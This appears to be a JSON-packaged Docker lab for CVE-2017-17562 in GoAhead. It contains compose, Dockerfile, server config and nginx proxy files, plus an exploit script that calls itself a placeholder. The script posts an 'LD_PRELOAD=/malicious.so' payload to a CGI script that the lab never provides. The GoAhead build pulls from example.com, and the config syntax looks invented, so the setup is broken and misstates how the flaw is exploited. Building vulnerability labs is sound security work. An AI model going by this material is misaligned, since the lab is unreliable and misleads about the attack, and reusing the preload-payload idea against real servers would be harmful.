{
    "files": [
        {
            "location": "./../../dockers/CVE-2017-17562/custom_no_tool/docker-compose.yml",
            "content": "version: '3.7'\n\nservices:\n  goahead:\n    build: ./goahead\n    ports:\n      - \"8080:80\"\n    networks:\n      - cve-network\n\n  nginx:\n    image: nginx:1.21\n    ports:\n      - \"8081:80\"\n    volumes:\n      - ./nginx/nginx.conf:/etc/nginx/nginx.conf\n    depends_on:\n      - goahead\n    networks:\n      - cve-network\n\n  exploit:\n    build: ./exploit\n    networks:\n      - cve-network\n\nnetworks:\n  cve-network:\n    driver: bridge\n"
        },
        {
            "location": "./../../dockers/CVE-2017-17562/custom_no_tool/goahead/Dockerfile",
            "content": "FROM alpine:3.7\n\nRUN apk add --no-cache build-base wget tar\n\n# Download and extract GoAhead source\nRUN wget https://example.com/goahead-3.6.5.tar.gz -O /tmp/goahead-3.6.5.tar.gz \\\n    && mkdir -p /goahead-3.6.5 \\\n    && tar -xzf /tmp/goahead-3.6.5.tar.gz -C /goahead-3.6.5 --strip-components=1 \\\n    && rm /tmp/goahead-3.6.5.tar.gz\n\nRUN cd /goahead-3.6.5 \\\n    && make \\\n    && cp /goahead-3.6.5/build/linux-x86-default/bin/goahead /usr/local/bin/ \\\n    && rm -rf /goahead-3.6.5\n\nCOPY goahead.conf /etc/goahead/goahead.conf\n\nCMD [\"goahead\", \"/etc/goahead/goahead.conf\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2017-17562/custom_no_tool/goahead/goahead.conf",
            "content": "server {\n    root \"/var/www/goahead\";\n    home \"/index.html\";\n    cgi \"/cgi-bin/**\";\n    cgi-bin \"/var/www/goahead/cgi-bin\";\n}\n"
        },
        {
            "location": "./../../dockers/CVE-2017-17562/custom_no_tool/nginx/nginx.conf",
            "content": "events {}\n\nhttp {\n    server {\n        listen 80;\n\n        location / {\n            proxy_pass http://goahead:80;\n        }\n    }\n}\n"
        },
        {
            "location": "./../../dockers/CVE-2017-17562/custom_no_tool/exploit/Dockerfile",
            "content": "FROM python:3.7\n\nWORKDIR /app\n\nCOPY exploit.py ./\n\nCMD [\"python\", \"exploit.py\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2017-17562/custom_no_tool/exploit/exploit.py",
            "content": "import requests\n\n# This script is a placeholder for an exploit targeting CVE-2017-17562\n# In a real scenario, you would craft a request that exploits the vulnerability\n\ndef exploit_goahead():\n    url = \"http://nginx:80/cgi-bin/vulnerable_script.cgi\"\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0\",\n        \"Content-Type\": \"application/x-www-form-urlencoded\"\n    }\n    payload = \"LD_PRELOAD=/malicious.so\"\n\n    response = requests.post(url, headers=headers, data=payload)\n    print(f\"Response Code: {response.status_code}\")\n    print(f\"Response Body: {response.text}\")\n\nif __name__ == \"__main__\":\n    exploit_goahead()\n"
        }
    ],
    "directory_tree": "CVE-2017-17562/\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 exploit\n\u2502   \u251c\u2500\u2500 Dockerfile\n\u2502   \u2514\u2500\u2500 exploit.py\n\u251c\u2500\u2500 goahead\n\u2502   \u251c\u2500\u2500 Dockerfile\n\u2502   \u2514\u2500\u2500 goahead.conf\n\u2514\u2500\u2500 nginx\n    \u2514\u2500\u2500 nginx.conf\n"
}